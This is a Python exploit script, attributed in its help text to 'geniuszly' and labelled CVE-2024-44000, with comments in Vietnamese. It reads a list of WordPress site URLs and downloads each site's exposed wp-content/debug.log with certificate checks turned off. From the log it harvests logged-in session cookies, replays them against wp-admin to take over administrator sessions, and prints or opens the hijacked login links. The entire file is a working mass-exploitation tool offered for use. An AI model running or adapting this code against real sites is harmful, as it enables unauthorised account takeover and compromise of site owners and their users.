import requests
import re
import argparse
from urllib.parse import urljoin, quote
import tempfile
import webbrowser
import urllib3
from urllib3.exceptions import InsecureRequestWarning

# Vô hiệu hóa cảnh báo xác thực SSL
urllib3.disable_warnings(InsecureRequestWarning)

def read_log_and_extract_cookies(log_file_path):
    cookie_list = []
    # Nhập thêm 'encoding="utf-8"' để đọc tệp
    with open(log_file_path, 'r', encoding='utf-8') as log_file:
        for log_line in log_file:
            cookie = extract_cookie_from_line(log_line)
            if cookie:
                cookie_list.append(cookie)
    return cookie_list

def extract_cookie_from_line(log_line):
    cookie_match = re.search(r'Cookie: (.*)', log_line)
    return cookie_match.group(1) if cookie_match else None

# Hàm để lọc session cookies
def filter_session_cookies(cookie_list):
    session_cookie_list = []
    for each_cookie in cookie_list:
        session_cookie = extract_session_cookie(each_cookie)
        if session_cookie:
            session_cookie_list.append(session_cookie)
    return session_cookie_list

# Trích xuất session cookies từ cookie cụ thể
def extract_session_cookie(cookie):
    session_match = re.search(r'wordpress_logged_in_[^=]+=[^;]+', cookie)
    return session_match.group(0) if session_match else None

# Hàm để xử lý URL
def process_url_and_extract_cookies(site_url):
    current_session = requests.Session()

    # Kiểm tra và thêm giao thức nếu cần thiết
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url  # Hoặc 'http://' tùy thuộc vào yêu cầu cụ thể

    # Đảm bảo site_url kết thúc bằng '/'
    if not site_url.endswith('/'):
        site_url += '/'

    log_url_path = urljoin(site_url, "wp-content/debug.log")

    try:
        # Lấy log từ trang web
        response = current_session.get(log_url_path, allow_redirects=False, timeout=10, verify=False)

        if response.status_code == 200:
            print(f"[+] Log file đã được lấy thành công từ {site_url}")
            log_file_path = save_logs_to_tempfile(response.text)

            # Trích xuất và lọc session cookies
            cookies = read_log_and_extract_cookies(log_file_path)
            session_cookies = filter_session_cookies(cookies)

            # Xử lý session cookies
            if session_cookies:
                return process_session_cookies(session_cookies, site_url, current_session)
            else:
                return f"[-] Không tìm thấy session cookies trong log cho {site_url}\n"
        else:
            return f"[-] Không thể lấy log file cho {site_url}. Mã phản hồi: {response.status_code}\n"
    except requests.RequestException as error_message:
        return f"[-] Lỗi khi truy cập {site_url}: {error_message}\n"



# Lưu log vào tệp tạm
def save_logs_to_tempfile(log_data):
    with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False) as tmp_file:
        tmp_file.write(log_data)
        return tmp_file.name

# Xử lý các session cookies tìm thấy để bắt giữ phiên
def process_session_cookies(session_cookies, site_url, current_session):
    result_message = f"[+] Đã tìm thấy session cookies cho {site_url}:\n"
    for cookie in session_cookies:
        result_message += f"    {cookie}\n"
    
    for admin_cookie in session_cookies:
        cookie_name, cookie_value = admin_cookie.split('=')
        current_session.cookies.set(cookie_name, cookie_value)
        
        # Thử đăng nhập vào quản trị
        admin_url = urljoin(site_url, "wp-admin/")
        if attempt_admin_login(admin_url, cookie_name, cookie_value, current_session):
            hijacked_url = generate_hijacked_url(site_url, admin_url, cookie_name, cookie_value)
            result_message += f"[+] Đã bắt giữ phiên quản trị thành công với cookie: {admin_cookie}\n"
            result_message += f"[+] URL của phiên bị bắt giữ: {hijacked_url}\n"
            open_browser_with_cookie(site_url, cookie_name, cookie_value)
            return result_message
        else:
            result_message += f"[-] Không thể bắt giữ phiên quản trị với cookie: {admin_cookie}\n"
    return result_message

# Thử đăng nhập vào admin
def attempt_admin_login(admin_url, cookie_name, cookie_value, current_session):
    admin_response = current_session.get(admin_url, allow_redirects=False)
    return admin_response.status_code == 302 and 'wp-admin' in admin_response.headers.get('Location', '')

# Tạo URL cho phiên bị bắt giữ
def generate_hijacked_url(site_url, admin_url, cookie_name, cookie_value):
    return f"{urljoin(site_url, 'wp-login.php')}?redirect_to={quote(admin_url + f'?{cookie_name}={cookie_value}')}&reauth=1"

# Mở trình duyệt với cookie đã thiết lập
def open_browser_with_cookie(site_url, cookie_name, cookie_value):
    webbrowser.open(urljoin(site_url, 'wp-login.php') + f"?cookie={cookie_name}={cookie_value}")

# Đọc danh sách URL từ tệp và xử lý
def read_urls_from_file_and_process(file_with_urls):
    with open(file_with_urls, 'r') as file:
        url_list = file.read().splitlines()
    
    all_results = []
    for site_url in url_list:
        if site_url:
            result = process_url_and_extract_cookies(site_url)
            all_results.append(result)
    
    return all_results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trích xuất và sử dụng session cookies (CVE-2024-44000) by geniuszly")
    parser.add_argument("-f", "--file", help="Đường dẫn đến tệp chứa URL", default="list.txt")
    parser.add_argument("-o", "--output", help="Tệp để lưu kết quả", default="result.txt")
    args = parser.parse_args()

    # Đọc và xử lý URL từ tệp
    results = read_urls_from_file_and_process(args.file)

    # Lưu kết quả vào tệp
    with open(args.output, 'w', encoding='utf-8') as output_file:
        output_file.write("\n".join(results))

    print(f"[+] Kết quả đã được lưu vào {args.output}")
